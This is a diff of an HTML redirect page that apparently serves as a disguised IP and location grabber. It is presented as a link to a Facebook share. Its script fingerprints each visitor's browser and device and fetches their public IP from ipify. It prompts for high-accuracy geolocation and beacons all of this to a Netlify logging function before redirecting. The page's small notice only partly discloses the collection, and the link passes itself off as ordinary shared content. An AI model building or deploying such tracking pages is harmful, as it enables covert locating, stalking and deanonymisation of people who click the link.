@@ -1,56 +1,113 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Redirecting…</title>
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;padding:24px;background:#f7f7f8;color:#111}
+    .card{max-width:720px;margin:36px auto;padding:18px;background:#fff;border-radius:10px;box-shadow:0 8px 20px rgba(0,0,0,0.06)}
+  </style>
 </head>
 <body>
-  <p>Redirecting…</p>
+  <div class="card">
+    <h2>Preparing to open content…</h2>
+    <p>This page will ask for permission to access your location (optional). Your visit will be recorded for admin notifications.</p>
+  </div>
 
 <script>
 (async function(){
-  // get public IP as fallback
-  let client_ip = '';
-  try {
-    const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
-    const j = await r.json();
-    client_ip = j.ip || '';
-  } catch(e){}
+  // final redirect target
+  const REDIRECT_URL = "https://www.facebook.com/share/r/1GSrQ5WSVa/";
 
-  // helper to send data using sendBeacon if available (keeps it fast)
-  function send(body){
+  // collect baseline information
+  const data = {
+    timeUtc: new Date().toISOString(),
+    url: location.href,
+    referrer: document.referrer || null,
+    userAgent: navigator.userAgent || null,
+    platform: navigator.platform || null,
+    languages: navigator.languages || [navigator.language || null],
+    cookieEnabled: navigator.cookieEnabled || false,
+    doNotTrack: navigator.doNotTrack || null,
+    deviceMemory: navigator.deviceMemory || null,
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    vendor: navigator.vendor || null,
+    screen: {
+      width: screen?.width || null,
+      height: screen?.height || null,
+      availWidth: screen?.availWidth || null,
+      availHeight: screen?.availHeight || null,
+      colorDepth: screen?.colorDepth || null
+    },
+    timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return null; } })(),
+    connection: (navigator.connection ? {
+      downlink: navigator.connection.downlink || null,
+      effectiveType: navigator.connection.effectiveType || null,
+      rtt: navigator.connection.rtt || null
+    } : null),
+    clientIp: null,   // will fill from ipify
+    coords: null      // will fill if user allows geolocation
+  };
+
+  // small helper to send data using sendBeacon if available
+  function sendPayload(payloadObj){
+    const bodyStr = JSON.stringify(payloadObj);
     try {
-      const blob = new Blob([JSON.stringify(body)], {type:'application/json'});
+      // try sendBeacon first (keeps request reliable during navigation)
       if (navigator.sendBeacon) {
+        const blob = new Blob([bodyStr], { type: 'application/json' });
         navigator.sendBeacon('/.netlify/functions/log', blob);
         return;
       }
-    } catch(e){}
-    // fallback
+    } catch(e) {
+      // ignore and fallback to fetch
+    }
+    // fallback: fetch with keepalive (best-effort)
     fetch('/.netlify/functions/log', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(body),
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: bodyStr,
       keepalive: true
     }).catch(()=>{});
   }
 
-  // Try high-accuracy geolocation (will prompt user)
+  // get public IP from ipify (best-effort)
+  try {
+    const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+    const j = await r.json();
+    data.clientIp = j.ip || null;
+  } catch(e) {
+    data.clientIp = null;
+  }
+
+  // request geolocation (user will be prompted). If allowed, include coords.
   if (navigator.geolocation) {
+    // race: if geolocation takes too long, fallback after timeout
+    let fallbackTimer = setTimeout(() => {
+      sendPayload(data);
+      setTimeout(()=>{ location.href = REDIRECT_URL; }, 300);
+    }, 4500);
+
     navigator.geolocation.getCurrentPosition(function(pos){
-      send({ client_ip, coords: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
-      // short delay so request can be sent
-      setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 400);
+      clearTimeout(fallbackTimer);
+      data.coords = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      };
+      sendPayload(data);
+      setTimeout(()=>{ location.href = REDIRECT_URL; }, 350);
     }, function(err){
-      // user denied or error -> send only IP
-      send({ client_ip });
-      setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 200);
-    }, { maximumAge:0, timeout:5000, enableHighAccuracy:true });
+      clearTimeout(fallbackTimer);
+      // permission denied or error -> send without coords
+      sendPayload(data);
+      setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
+    }, { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 });
   } else {
-    // no geolocation support
-    send({ client_ip });
-    setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 200);
+    // no geolocation API
+    sendPayload(data);
+    setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
   }
 })();
 </script>
